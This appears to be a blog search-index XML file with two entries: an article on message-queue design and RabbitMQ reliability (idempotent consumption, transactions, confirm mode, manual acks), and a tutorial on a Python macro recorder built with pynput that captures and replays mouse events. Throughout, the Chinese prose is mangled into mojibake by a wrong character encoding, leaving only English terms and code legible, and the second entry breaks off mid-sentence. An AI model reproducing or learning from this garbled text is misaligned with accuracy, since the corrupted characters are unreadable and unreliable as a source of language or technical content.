<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[æ¶ˆæ¯é˜Ÿåˆ—çŸ¥è¯†ç‚¹æ¢³ç†]]></title>
    <url>%2Fcb6b0010%2F</url>
    <content type="text"><![CDATA[æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰ç®€ç§°MQï¼Œç”¨äºŽåº”ç”¨ç¨‹åºä¹‹é—´çš„æ¶ˆæ¯ä¼ é€’ï¼Œåœ¨æ¶ˆæ¯ä¸­é—´ä»¶é¢†åŸŸæœ‰ç€å¹¿æ³›çš„åº”ç”¨ã€‚é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼ˆAdvenced Message Queuing Protocolï¼‰ç®€ç§°ï¼ˆAMQPï¼‰ï¼Œæ˜¯åº”ç”¨å±‚åè®®çš„ä¸€ä¸ªå¼€æ”¾æ ‡å‡†ã€‚AMQPåè®®å¯ä»¥ä½¿ç”¨ä»»ä½•ç¼–ç¨‹è¯­è¨€å®žçŽ°ï¼ŒåŸºäºŽAMQPåè®®å®žçŽ°çš„ä¸­é—´ä»¶æœ‰ï¼šRabbitMQã€ActiveMQã€RocketMQç­‰ã€‚ åŸºç¡€éƒ¨åˆ†ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„ä¼˜ç‚¹ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ä¹‹å‰ï¼Œå¯ä»¥å…ˆçœ‹çœ‹æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Œèƒ½å¤Ÿè§£å†³ä»€ä¹ˆæ ·çš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„åŽŸå›  è§£è€¦ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å‰ç³»ç»ŸAç›´æŽ¥è°ƒç”¨ç³»ç»ŸBã€ç³»ç»ŸCï¼Œè°ƒç”¨ä»£ç æ˜¯ç¡¬ç¼–ç çš„ï¼Œç³»ç»Ÿä¹‹é—´å­˜åœ¨ä¾èµ–è€¦åˆçš„å…³ç³»ã€‚å¦‚æžœåŽç»­æœ‰æ–°çš„ç³»ç»Ÿéœ€è¦æŽ¥å…¥åˆ°Aç³»ç»Ÿä¸­ï¼Œé‚£ä¹ˆå°±éœ€è¦é€šè¿‡ä¸æ–­çš„ä¿®æ”¹Aç³»ç»Ÿçš„ä»£ç æ¥å®žçŽ°ï¼Œä¸åˆ©äºŽç³»ç»Ÿæ‰©å±•ã€‚ ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—åŽç³»ç»ŸAä¸ç›´æŽ¥è°ƒç”¨å…¶ä»–ç³»ç»Ÿï¼Œè€Œæ˜¯å°†æ¶ˆæ¯å‘é€ç»™æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç³»ç»ŸAä¸å¿…å…³å¿ƒæœ‰å¤šå°‘ä¸ªç³»ç»Ÿä¼šæ¶ˆè´¹è¯¥æ¶ˆæ¯ã€‚åŽç»­æœ‰æ–°ç³»ç»Ÿéœ€è¦æŽ¥å…¥æ—¶ï¼Œåªéœ€è¦è®¢é˜…æ¶ˆæ¯é˜Ÿåˆ—å³å¯ã€‚ å¼‚æ­¥ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å‰ç³»ç»ŸAè°ƒç”¨ä¸€ä¸ªæ ¸å¿ƒä¸šåŠ¡å¾ˆå¿«å°±å®Œæˆäº†ï¼Œä½†æ˜¯åŽç»­è¿˜éœ€è¦ç­‰å¾…éžæ ¸å¿ƒä¸šåŠ¡å®ŒæˆåŽæ‰é€šçŸ¥ç”¨æˆ·æ‰§è¡ŒæˆåŠŸï¼Œè¿™æ ·ç­‰å¾…æ—¶é—´å¤ªä¹…äº†ç”¨æˆ·ä¼šä¸è€çƒ¦ã€‚ ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—åŽç³»ç»ŸAåœ¨1mså†…å®Œæˆæ ¸å¿ƒä¸šåŠ¡çš„è°ƒç”¨å¹¶é€šçŸ¥ç”¨æˆ·æ‰§è¡ŒæˆåŠŸï¼Œæ•´ä¸ªè¿‡ç¨‹ç”¨æˆ·åªç­‰å¾…äº†1msï¼Œå¾ˆå¤§ç¨‹åº¦çš„æé«˜äº†ç”¨æˆ·ä½“éªŒã€‚æ ¸å¿ƒä¸šåŠ¡æˆåŠŸå‘é€æ¶ˆæ¯åˆ°MQå°±ç®—ä¸šåŠ¡æ‰§è¡Œå®Œæˆäº†ï¼Œä¸å¿…å…³å¿ƒåŽé¢çš„éžæ ¸å¿ƒä¸šåŠ¡æ˜¯å¦å·²ç»æ¶ˆè´¹æ¶ˆæ¯ã€‚åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ä¹Ÿç»å¸¸ä¼šä½¿ç”¨åˆ°è¿™ç§å¼‚æ­¥æ–¹å¼ï¼Œå¯ä»¥å¯¹æµé‡è¿›è¡Œæ¶ˆå³°ï¼Œå°†éžæ ¸å¿ƒä¸šåŠ¡æ”¾åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ»žåŽå¤„ç†ï¼Œç­‰å¾…èµ„æºç©ºé—²æ—¶ä»Žé˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯é€ä¸ªå¤„ç†ã€‚ ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„ç¼ºç‚¹ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„ä¼˜ç‚¹åŒæ ·ä¹Ÿäº§ç”Ÿäº†ç›¸åº”çš„ç¼ºç‚¹ï¼Œè¦è¶³å¤Ÿäº†è§£æ‰€å¯èƒ½å¸¦æ¥åˆ°é£Žé™©å¹¶ä¸”æ ¹æ®å®žé™…ä¸šåŠ¡åœºæ™¯åˆç†è§„é¿é£Žé™©ã€‚ è§£è€¦å½±å“ç³»ç»Ÿå¯ç”¨æ€§å¼•å…¥äº†æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åŽï¼Œç”±äºŽå„ä¸ªç³»ç»Ÿä¹‹é—´é‡‡ç”¨æ¶ˆæ¯é˜Ÿåˆ—è¿›è¡Œé€šä¿¡ï¼Œå¦‚æžœæ¶ˆæ¯é˜Ÿåˆ—åœæ­¢è¿è¡Œäº†ï¼Œé‚£ä¹ˆç›¸å½“äºŽæ•´ä¸ªæž¶æž„ä½“ç³»å†…çš„ç³»ç»Ÿéƒ½å˜æˆäº†ä¸å¯ç”¨ã€‚ å¼‚æ­¥å¢žåŠ ç³»ç»Ÿå¤æ‚æ€§ç”±äºŽç½‘ç»œæ•…éšœç­‰åŽŸå› ï¼Œæ¶ˆè´¹è€…åœ¨æ¶ˆè´¹å®ŒæˆåŽæ²¡æœ‰å‘é€ç¡®è®¤æ¶ˆæ¯ç»™æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ¶ˆæ¯é˜Ÿåˆ—è®¤ä¸ºæ¶ˆæ¯æ²¡æœ‰é€è¾¾è€Œé‡å¤å‘é€æ¶ˆæ¯ï¼Œå¯¼è‡´è®¢é˜…è€…æ”¶åˆ°å¤šæ¬¡ç›¸åŒåˆ°æ¶ˆæ¯é‡å¤æ¶ˆè´¹ï¼Œè¿™æ—¶å°±éœ€è¦æ¶ˆè´¹è€…è‡ªå·±å¤„ç†é‡å¤æ¶ˆæ¯ã€‚ç”±äºŽç½‘ç»œæ•…éšœæˆ–è€…å…¶ä»–ä¸å¯æŠ—æ‹’çš„å¤–éƒ¨å› ç´ ï¼Œå¦‚ä½•ä¿è¯å¯é æ€§ä¼ è¾“ä¹Ÿæ˜¯è¦è§£å†³çš„ä¸€ä¸ªé—®é¢˜ï¼Œä¸»è¦ä½“çŽ°åœ¨ä»¥ä¸‹4ä¸ªæ–¹é¢ï¼šé˜²æ­¢é‡å¤æ¶ˆè´¹çš„é—®é¢˜ã€é˜²æ­¢ç”Ÿäº§è€…ä¸¢æ•°æ®ã€é˜²æ­¢æ¶ˆæ¯é˜Ÿåˆ—ä¸¢æ•°æ®ã€é˜²æ­¢æ¶ˆè´¹è€…ä¸¢æ•°æ®ã€‚ é’ˆå¯¹æ¶ˆæ¯é˜Ÿåˆ—çš„ç¼ºç‚¹å¦‚ä½•è¿›è¡Œå®Œå–„å¦‚ä½•ä¿è¯é«˜å¯ç”¨ä¸€èˆ¬åœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­éƒ½ä¼šé‡‡ç”¨æ¶ˆæ¯é˜Ÿåˆ—é›†ç¾¤å’Œä¸»ä»Žæ¨¡å¼æ¥ä¿è¯é«˜å¯ç”¨ï¼Œæ–‡ç« åŽåŠéƒ¨åˆ†éƒ½ä»¥RabbitMQçš„å®žçŽ°æ–¹å¼ä¸ºä¾‹ã€‚ å¦‚ä½•é˜²æ­¢é‡å¤æ¶ˆè´¹çš„é—®é¢˜è§£å†³è¿™ä¸ªé—®é¢˜ä¹‹å‰å…ˆè€ƒè™‘ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆä¼šæ”¶åˆ°é‡å¤æ¶ˆæ¯ï¼Ÿè¿™é‡Œä»¥RabbitMQä¸ºä¾‹ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œæ¶ˆè´¹è€…åœ¨æ¶ˆè´¹å®Œæ¶ˆæ¯ä¹‹åŽéƒ½ä¼šç»™æ¶ˆæ¯é˜Ÿåˆ—å‘é€ä¸€ä¸ªç¡®è®¤ä¿¡æ¯ï¼Œæ¶ˆæ¯é˜Ÿåˆ—æ”¶åˆ°è¯¥ç¡®è®¤ä¿¡æ¯åŽä¼šå°†è¯¥æ¶ˆæ¯åˆ é™¤ï¼Œå› ä¸ºç½‘ç»œæ•…éšœç­‰åŽŸå› ï¼Œæ¶ˆæ¯é˜Ÿåˆ—æ²¡æœ‰æ”¶åˆ°æ¶ˆè´¹è€…çš„ç¡®è®¤ä¿¡æ¯ï¼Œå¯¼è‡´æ¶ˆæ¯é˜Ÿåˆ—ç»§ç»­å­˜åœ¨è¯¥æ¶ˆæ¯ï¼Œå¹¶ä¸”ä¸‹æ¬¡ä¼šé‡å¤è¢«æ¶ˆè´¹ã€‚è§£å†³çš„æ–¹å¼å¯ä»¥æ ¹æ®å®žé™…ä¸šåŠ¡åœºæ™¯æ¥å†³å®šï¼š ä¸šåŠ¡ç³»ç»ŸæŽ¥æ”¶åˆ°æ¶ˆæ¯ä¹‹åŽä¸€èˆ¬ä¼šæœ‰å…¥åº“æ“ä½œï¼Œå°†æ¶ˆæ¯çš„idä½œä¸ºè®°å½•ä¸»é”®ï¼Œä¸€æ—¦æ”¶åˆ°é‡å¤æ¶ˆæ¯å°±ä¼šæŠ›å‡ºä¸»é”®æ’å…¥å¼‚å¸¸ã€‚ ä¸šåŠ¡ç³»ç»Ÿå°†æ¶ˆæ¯å¤„ç†ç»“æžœå­˜å‚¨åˆ°redisä¸­ï¼ŒåŒæ ·ä½¿ç”¨æ¶ˆæ¯çš„idä½œä¸ºkeyï¼Œå³ä½¿æ”¶åˆ°åŒæ ·çš„æ¶ˆæ¯setäº†å¤šæ¬¡ä¹Ÿåªä¼šæœ‰ä¸€æ¡æ¶ˆæ¯ï¼Œå› ä¸ºæ¶ˆæ¯idä¸€æ ·ï¼Œæ‰€ä»¥æ— è®ºè®¾ç½®å¤šå°‘æ¬¡éƒ½ä¼šä¿è¯å¹‚ç­‰æ€§ã€‚ é‡‡ç”¨redisçš„key-valueæ–¹å¼åšä¸€ä¸ªæ¶ˆè´¹è®°å½•ï¼Œæ¶ˆè´¹è€…æ”¶åˆ°æ¶ˆæ¯åŽå…ˆæ‹¿æ¶ˆæ¯idåŽ»æ¶ˆè´¹è®°å½•é‡ŒæŸ¥æ‰¾ï¼Œå¦‚æžœæŸ¥æ‰¾åˆ°äº†è¯´æ˜Žå·²ç»è¢«æ¶ˆè´¹è¿‡äº†å°±ä¸å¤„ç†ç›¸å…³ä¸šåŠ¡ï¼Œå¦‚æžœæ¶ˆæ¯è®°å½•é‡Œæ²¡æœ‰è¯¥æ¶ˆæ¯çš„idï¼Œåˆ™å°†è¯¥æ¶ˆæ¯setåˆ°redisè®°å½•ä¸­ï¼Œå¹¶è¿›è¡Œç›¸å…³ä¸šåŠ¡å¤„ç†ã€‚å¦‚ä½•ä¿è¯ä¼ è¾“çš„å¯é æ€§è¦ä¿è¯ä¼ è¾“å¯é æ€§ï¼Œå°±è¦è€ƒè™‘åˆ°æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å‰åŽæœ‰å¯èƒ½å‘ç”Ÿåˆ°é—®é¢˜å¹¶è¿›è¡Œå¤„ç†ã€‚é˜²æ­¢ç”Ÿäº§è€…ä¸¢æ¶ˆæ¯ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—åˆ°è¿‡ç¨‹ä¸­ï¼Œç”±äºŽç½‘ç»œæ•…éšœç­‰å› ç´ å¯¼è‡´æ¶ˆæ¯é˜Ÿåˆ—æ— æ³•æŽ¥å—åˆ°æ¶ˆæ¯ã€‚RabbitMQæä¾›äº†ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š transactiontransactionæ¨¡å¼é‡‡ç”¨äº‹åŠ¡çš„æ–¹å¼ä¿è¯ç”Ÿäº§è€…æ¶ˆæ¯æˆåŠŸé€è¾¾åˆ°æ¶ˆæ¯é˜Ÿåˆ—ã€‚å‘æ¶ˆæ¯å‰å…ˆå¼€å¯äº‹åŠ¡ï¼Œç„¶åŽå†å‘é€æ¶ˆæ¯ï¼Œå‘é€çš„è¿‡ç¨‹ä¸­å¦‚æžœå¼‚å¸¸å°±æ‰§è¡Œå›žæ»šï¼ŒæˆåŠŸå°±æäº¤äº‹åŠ¡ã€‚ confirmé‡‡ç”¨transactionæ¨¡å¼çš„ç¼ºç‚¹æ˜¯æ¯æ¬¡å‘é€æ¶ˆæ¯å‰éƒ½è¦å…ˆå¼€å¯äº‹åŠ¡ï¼Œè¿™ç§æ“ä½œç†è®ºä¸Šä¼šé™ä½Žæ¶ˆæ¯é˜Ÿåˆ—çš„åžåé‡ã€‚confirmæ¨¡å¼ç›¸æ¯”transactionæ¨¡å¼æœ‰ç€æ›´é«˜çš„åžåé‡ï¼Œä¸€æ—¦ç”Ÿäº§è€…å°†æ¶ˆæ¯æŠ•é€’åˆ°æ‰€æœ‰åŒ¹é…åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åŽï¼ŒRabbitMQå°±ä¼šå‘é€ä¸€ä¸ªACKç»™ç”Ÿäº§è€…ï¼Œä½¿ç”Ÿäº§è€…çŸ¥é“æ¶ˆæ¯å·²ç»æ­£ç¡®åˆ°è¾¾ç›®çš„é˜Ÿåˆ—äº†ã€‚å¦‚æžœæ²¡æœ‰é€è¾¾æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ä¼šå‘é€ä¸€ä¸ªNackæ¶ˆæ¯ç»™ç”Ÿäº§è€…ï¼Œç”Ÿäº§è€…æŽ¥æ”¶åˆ°è¯¥æ¶ˆæ¯åŽå¯ä»¥å†³å®šæ˜¯å¦è¿›è¡Œé‡å‘ã€‚é˜²æ­¢æ¶ˆæ¯é˜Ÿåˆ—ä¸¢æ¶ˆæ¯å¼€å¯æŒä¹…åŒ–ç£ç›˜ï¼Œå¹¶é…åˆConfirmï¼Œæ¶ˆæ¯æŒä¹…åŒ–åˆ°ç£ç›˜åŽå†ç»™ç”Ÿäº§è€…å‘ä¸€ä¸ªACKä¿¡å·ï¼Œå¦‚æžœæŒä¹…åŒ–ç£ç›˜ä¹‹å‰MQå°±åœæ­¢è¿è¡Œäº†ï¼Œç”Ÿäº§è€…æ”¶ä¸åˆ°ACKä¿¡å·ä¼šè‡ªåŠ¨è¿›è¡Œé‡å‘ã€‚MQå¦‚æžœä¸€ç›´åœæ­¢è¿è¡Œï¼Œç”Ÿäº§è€…æ ¹æ®ä¸šåŠ¡åœºæ™¯è¿›è¡Œå¤šæ¬¡é‡è¯•ä»ç„¶å‘é€å¤±è´¥ï¼Œç”Ÿäº§è€…åº”è¯¥å®žçŽ°æŠ¥è­¦å¹¶è®°å½•æ—¥å¿—ã€‚é˜²æ­¢æ¶ˆè´¹è€…ä¸¢æ¶ˆæ¯æ¶ˆè´¹è€…æ”¶åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„æ¶ˆæ¯åŽä¼šè‡ªåŠ¨å‘é€ä¸€ä¸ªACKç¡®è®¤æ¶ˆæ¯ç»™æ¶ˆæ¯é˜Ÿåˆ—ã€‚åœ¨æŽ¥æ”¶åˆ°æ¶ˆæ¯å¹¶å‘é€ç¡®è®¤æ”¶åˆ°ä¿¡æ¯åŽï¼Œç”±äºŽæ¶ˆè´¹è€…è‡ªèº«çš„ä¸šåŠ¡å¼‚å¸¸å¯¼è‡´æ¶ˆæ¯æ²¡æœ‰è¢«åˆç†çš„å¤„ç†ï¼Œå¯¼è‡´æ¶ˆæ¯ä¸¢å¤±ã€‚å¯ä»¥æ ¹æ®å®žé™…çš„ä¸šåŠ¡åœºæ™¯ï¼Œå°†è‡ªåŠ¨å‘é€ç¡®è®¤æ¶ˆæ¯æ”¹ä¸ºæ‰‹åŠ¨å‘é€ï¼Œåœ¨æ¶ˆè´¹è€…ä¸šåŠ¡ä»£ç æ­£å¸¸æ‰§è¡Œå®Œæˆä¹‹åŽå†æ‰‹åŠ¨ç¡®è®¤æ¶ˆæ¯ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonå®žçŽ°ä¸€ä¸ªæŒ‰é”®ç²¾çµ]]></title>
    <url>%2F2fb233e2%2F</url>
    <content type="text"><![CDATA[æŒ‰é”®ç²¾çµæƒ³å¿…å¾ˆå¤šäººéƒ½çŽ©è¿‡ï¼Œä½¿ç”¨å½•åˆ¶åŠŸèƒ½å°†é¼ æ ‡å’Œé”®ç›˜çš„æ“ä½œå½•åˆ¶ä¸‹æ¥ï¼Œå½•åˆ¶å¥½åŽå°±å¯ä»¥é€šè¿‡å›žæ”¾è‡ªåŠ¨æ‰§è¡Œä¹‹å‰å½•åˆ¶çš„æ“ä½œï¼Œå¯ä»¥è®¾ç½®é‡å¤æ‰§è¡Œçš„æ¬¡æ•°ï¼Œè¿™æ ·å°±å¯ä»¥å°†ä¸€äº›é‡å¤çš„åŠ³åŠ¨äº¤ç»™è„šæœ¬è‡ªåŠ¨åŒ–åŽ»å®Œæˆã€‚ä½¿ç”¨Pythonç¼–å†™ä¸€ä¸ªå’Œè„šæœ¬ç²¾çµä¸€æ ·çš„ç¨‹åºéžå¸¸ç®€å•ï¼Œå¹¶ä¸”ä»£ç é‡è¶³å¤Ÿå°‘ï¼Œå¥½å¤„æ˜¯å¯ä»¥ä¸å†ä¾èµ–æŒ‰é”®ç²¾çµï¼Œåƒæˆ‘è¿™ç§æœ‰è½»å¾®æ´ç™–çš„ç¨‹åºçŒ¿å°±å–œæ¬¢è‡ªå·±åŠ¨æ‰‹å®žçŽ°,ä¾èµ–Pythonçš„ä¸ºæ‰€æ¬²ä¸ºçš„ç‰¹æ€§ï¼Œå¯ä»¥ä»»æ„ç¼–ç è®©è‡ªå·±çš„æŒ‰é”®ç²¾çµæ›´åŠ å¼ºå¤§ã€‚æŒ‰é”®ç²¾çµçš„å®žçŽ°å¯ä»¥æ‹†è§£åˆ†ä¸ºå½•åˆ¶å’Œå›žæ”¾ä¸¤ä¸ªæ­¥éª¤ï¼Œå¯¹åº”åˆ°Pythonç¨‹åºçš„å®žçŽ°ä¹Ÿå¯ä»¥åˆ†ä¸ºä¸¤æ­¥ï¼š1.ç›‘å¬é¼ æ ‡é”®ç›˜çš„äº‹ä»¶å’Œåæ ‡ï¼Œå†™å…¥åˆ°æ–‡ä»¶ä¸­è®°å½•èµ·æ¥ã€‚2.è¯»å–ç›‘å¬æ—¶å†™å…¥çš„æ–‡ä»¶ï¼Œæ‰§è¡Œæ–‡ä»¶ä¸­çš„åæ ‡å’Œäº‹ä»¶æ“ä½œã€‚ è¦å®žçŽ°è¿™ä¸¤ä¸ªåŠŸèƒ½ï¼Œå¾—å…ˆä»ŽåŸºç¡€å¼€å§‹ã€‚æˆ‘æŠŠä»»åŠ¡æ‹†è§£æˆä¸¤å¤§éƒ¨åˆ†ï¼Œé¼ æ ‡å’Œé”®ç›˜å±žäºŽä¸åŒçš„ä¸¤ä¸ªè¾“å…¥è®¾å¤‡ï¼Œæ‰€ä»¥åˆ†å¼€å®žçŽ°â€œé¼ æ ‡ç²¾çµâ€å’Œâ€œé”®ç›˜ç²¾çµâ€ä¸¤ä¸ªç¨‹åºï¼Œæœ€åŽèžåˆè¿™ä¸¤ä¸ªæ¨¡å—å®žçŽ°ä¸€ä¸ªç›¸å¯¹å®Œæ•´çš„æŒ‰é”®ç²¾çµã€‚ Pythonæ“ä½œé”®ç›˜é¼ æ ‡çš„åº“æŽ¨èpynputè¿™ä¸ªåº“ã€åœ°å€ï¼šhttps://pypi.org/project/pynput/ é¼ æ ‡äº‹ä»¶ç›‘å¬123456789101112131415161718192021from pynput import mouse# é¼ æ ‡ç§»åŠ¨äº‹ä»¶def on_move(x, y): print('[Move]', (x, y))# é¼ æ ‡ç‚¹å‡»äº‹ä»¶def on_click(x, y, button, pressed): print('[Click]', (x, y, button.name, pressed))# é¼ æ ‡æ»šåŠ¨äº‹ä»¶def on_scroll(x, y, x_axis, y_axis): print('[Scroll]', (x, y, x_axis, y_axis))# ç›‘å¬äº‹ä»¶ç»‘å®šwith mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener: listener.join() onMove(x,y)å‡½æ•°æŽ¥æ”¶é¼ æ ‡å½“å‰çš„xè½´å’Œyè½´åæ ‡ï¼Œå¯åŠ¨ç¨‹åºå¹¶ç§»åŠ¨é¼ æ ‡æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥æ–¹æ³•ã€‚on_click(x, y, button, pressed)å‡½æ•°æŽ¥æ”¶é¼ æ ‡çš„ç‚¹å‡»äº‹ä»¶ï¼Œxå’Œyä¸ºå½“å‰ç‚¹å‡»äº‹ä»¶çš„é¼ æ ‡åæ ‡ï¼Œbuttonå‚æ•°å¯¹è±¡çš„nameå±žæ€§å€¼ä¸ºleftæˆ–è€…right,é€šè¿‡è¯¥å±žæ€§å€¼å¯ä»¥åˆ¤æ–­æ˜¯é¼ æ ‡çš„å·¦é”®è¿˜æ˜¯å³é”®äº§ç”Ÿçš„ç‚¹å‡»äº‹ä»¶ã€‚pressedå‚æ•°å€¼ä¸ºTrueæ—¶è¡¨ç¤ºå½“å‰é¼ æ ‡å·¦æˆ–å³é”®æŒ‰åŽ‹ï¼ŒFalseæ—¶è¡¨ç¤ºé¼ æ ‡å·¦æˆ–å³é”®æŠ¬èµ·äº‹ä»¶on_scroll(x, y, x_axis, y_axis)æŽ¥æ”¶å››ä¸ªå‚æ•°ï¼Œå‰ä¸¤ä¸ªå‚æ•°ä¾æ—§æ˜¯å½“å‰äº‹ä»¶çš„é¼ æ ‡åæ ‡è½´ï¼Œx_axisçš„å€¼&gt;0è¡¨ç¤ºå‘ä¸Šï¼Œ&lt;0è¡¨ç¤ºå‘ä¸‹ï¼ŒåŒæ ·çš„y_axisçš„è´Ÿå€¼å’Œæ­£å€¼ä»£è¡¨å·¦æ»‘å’Œå³æ»‘çŠ¶æ€ã€‚å½“ é¼ æ ‡äº‹ä»¶æ‰§è¡Œ12345678910111213141516171819202122232425262728293031323334353637from pynput.mouse import Button, Controllerimport time# èŽ·å–é¼ æ ‡å¯¹è±¡mouse = Controller()# è¾“å‡ºé¼ æ ‡å½“å‰çš„åæ ‡print(mouse.position)# å°†æ–°çš„åæ ‡èµ‹å€¼ç»™é¼ æ ‡å¯¹è±¡mouse.position = (100, 500)for index in range(0, 30): # é¼ æ ‡ç§»åŠ¨åˆ°æŒ‡å®šåæ ‡è½´ mouse.move(index, -index) print(mouse.position) time.sleep(0.01)for index in range(0, 30): # é¼ æ ‡ç§»åŠ¨åˆ°æŒ‡å®šåæ ‡è½´ mouse.move(-index, index) print(mouse.position) time.sleep(0.01)# é¼ æ ‡å³é”®æŒ‰ä¸‹mouse.press(Button.right)time.sleep(0.01)# é¼ æ ‡å³é”®æŠ¬èµ·mouse.release(Button.right)# é¼ æ ‡å·¦é”®ç‚¹å‡»mouse.click(Button.left, 1)# é¼ æ ‡æ»šè½®æ»šåŠ¨è·ç¦»500mouse.scroll(0, 500) å’Œé¼ æ ‡äº‹ä»¶ç›‘å¬ä¸€æ ·ï¼Œå¯¹åº”çš„æˆ‘ä»¬å¯ä»¥æ“ä½œé¼ æ ‡çš„å„ç§äº‹ä»¶ï¼šç§»åŠ¨ã€å·¦/å³æŒ‰åŽ‹ã€å·¦/å³æŠ¬èµ·ã€å·¦/å³ç‚¹å‡»ã€ä¸Šä¸‹å·¦å³æ»šåŠ¨ä¸Šé¢ä»£ç ä¸­çš„mouse.move(x,y)å‡½æ•°ï¼Œè¡¨ç¤ºä»Žå½“å‰é¼ æ ‡ä½ç½®è¿›è¡Œä½ç§»çš„è·ç¦»ï¼Œxå’Œyçš„å€¼æ˜¯ä»¥å½“å‰ä½ç½®ä¸º0ç‚¹å¼€å§‹ç®—çš„ã€‚è€Œä¸”ä¸èƒ½ç®€å•çš„ç”¨åæ ‡è½´åŽ»ç›¸å‡å¾—åˆ°ä½ç§»è·ç¦»ï¼Œæ‰€ä»¥åŽç»­çš„ç¨‹åºæˆ‘ä¼šä½¿ç”¨mouse.position = (x, y)è¿™ä¸ªå‡½æ•°æ¥æ“ä½œé¼ æ ‡çš„ç§»åŠ¨ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥å°†é¼ æ ‡è®¾ç½®åˆ°æŒ‡å®šä½ç½®ï¼Œåªè¦æˆ‘ä»¬è®°å½•ä¹‹å‰çš„é¼ æ ‡ç§»åŠ¨è½¨è¿¹ï¼Œå°±å¯ä»¥é€šè¿‡è¯»å–ä¹‹å‰çš„è®°å½•æ–‡ä»¶æŒ‰é¡ºåºé‡æ–°å¯¹é¼ æ ‡è¿›è¡Œèµ‹å€¼æ“ä½œã€‚è¾¾åˆ°å›žæ”¾çš„æ•ˆæžœã€‚ å¸¦å½•åˆ¶å›žæ”¾åŠŸèƒ½çš„é¼ æ ‡ç²¾çµç»“åˆé¼ æ ‡äº‹ä»¶çš„ç›‘å¬å’Œæ‰§è¡Œï¼Œå¹¶ä¸”å°†äº‹ä»¶è®°å½•åˆ°æ–‡ä»¶ä¸­ï¼Œå†åŠ ä¸ŠPythonè‡ªå¸¦çš„GUIï¼Œå°±å¯ä»¥å†™å‡ºä¸€ä¸ªç®€å•çš„é¼ æ ‡ç²¾çµäº†ã€‚å®žçŽ°æ€è·¯ï¼š å®šä¹‰ä¸€ä¸ªjsonæ ¼å¼çš„å¯¹è±¡æ¥ç»Ÿä¸€ä¸åŒé¼ æ ‡äº‹ä»¶çš„å†…å®¹æ ¼å¼12345678910&#123; "name":"mouse", "event":"click", "target":"left", "action":true, "location":&#123; "x":"0", "y":"0" &#125;&#125; é¼ æ ‡äº‹ä»¶çš„nameå€¼ä¸ºmouse,è€ƒè™‘åˆ°åŽç»­è¿˜æœ‰å¯èƒ½ä¼šæœ‰å…¶ä»–è®¾å¤‡çš„äº‹ä»¶ï¼Œæ¯”å¦‚é”®ç›˜äº‹ä»¶ã€‚é¼ æ ‡çš„äº‹ä»¶ä¸ºç‚¹å‡»äº‹ä»¶ï¼Œå°†eventèµ‹å€¼ä¸ºclickã€‚targetè¡¨ç¤ºç›®æ ‡ï¼Œç‚¹å‡»äº†é¼ æ ‡å·¦é”®,æ‰€ä»¥ç›®æ ‡å€¼ä¸ºleftactionè¡¨ç¤ºåŠ¨ä½œï¼Œé¼ æ ‡ç‚¹å‡»åˆ†ä¸ºæŒ‰åŽ‹å’ŒæŠ¬èµ·ï¼Œtrueè¡¨ç¤ºæŠ¬èµ·ã€‚locationçš„å€¼åŒ…å«ä¸€ä¸ªjsonå¯¹è±¡ï¼Œé‡Œé¢ä¸ºå½“å‰äº‹ä»¶é¼ æ ‡çš„xå’Œyåæ ‡ã€‚é¼ æ ‡çš„ç§»åŠ¨å’Œæ»‘åŠ¨äº‹ä»¶ä»¥æ­¤ç±»æŽ¨ï¼Œç”¨åŒæ ·çš„æ¨¡æ¿æ ¼å¼è¿›è¡Œè®°å½•ã€‚ å°†è®°å½•çš„æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ä¸­ æ‰§è¡Œå›žæ”¾æ—¶é€šè¿‡é€è¡Œè¯»å–æ–‡ä»¶ï¼Œè§£æžæ–‡ä»¶ä¸­çš„jsonæ•°æ®é€šè¿‡nameã€eventã€locationç­‰å€¼è¿›è¡Œäº‹ä»¶æ‰§è¡Œã€‚ ä¹‹æ‰€ä»¥é€‰æ‹©jsonæ—¶å› ä¸ºè§£æžèµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°æ®åº“ï¼Œæ¯”å¦‚SQLiteç­‰ï¼Œæˆ–è€…è‡ªå·±å®šä¹‰ä¸€å¥—è‡ªå·±çš„æ ¼å¼ã€‚jsonçš„å­˜å‚¨æ–¹å¼æœ‰å¤ªå¤šçš„å†—ä½™å­—ç¬¦äº†ï¼Œç©ºé—´å ç”¨ç›®å‰ä¸æ˜¯è€ƒè™‘çš„é¦–è¦å› ç´ 